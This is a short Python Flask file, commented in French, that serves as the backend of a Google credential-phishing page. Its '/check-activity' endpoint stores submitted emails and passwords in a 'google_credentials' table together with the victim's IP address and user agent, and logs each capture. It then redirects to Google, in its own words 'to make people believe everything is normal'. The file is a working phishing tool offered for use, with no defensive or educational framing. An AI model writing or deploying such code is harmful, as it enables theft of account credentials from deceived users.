import os
import psycopg2
from flask import Flask, request, redirect

app = Flask(__name__)

DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db_connection():
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def get_client_info():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Inconnu')
    return ip, ua

@app.route('/')
def index():
    # Redirection simple vers Google (ou votre page d'alerte si vous l'hébergez)
    return redirect('https://www.google.com')

@app.route('/check-activity', methods=['POST'])
def check_activity():
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return "Données manquantes", 400

    ip, ua = get_client_info()
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO google_credentials (email, password, ip_address, user_agent)
            VALUES (%s, %s, %s, %s)
        """, (email, password, ip, ua))
        conn.commit()
        cur.close()
        conn.close()
        print(f"🔐 Capturé : {email} / {password} depuis {ip}")
    except Exception as e:
        print(f"❌ Erreur BD : {e}")
        return "Erreur serveur", 500

    # Redirection vers Google pour faire croire que tout est normal
    return redirect('https://www.google.com')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
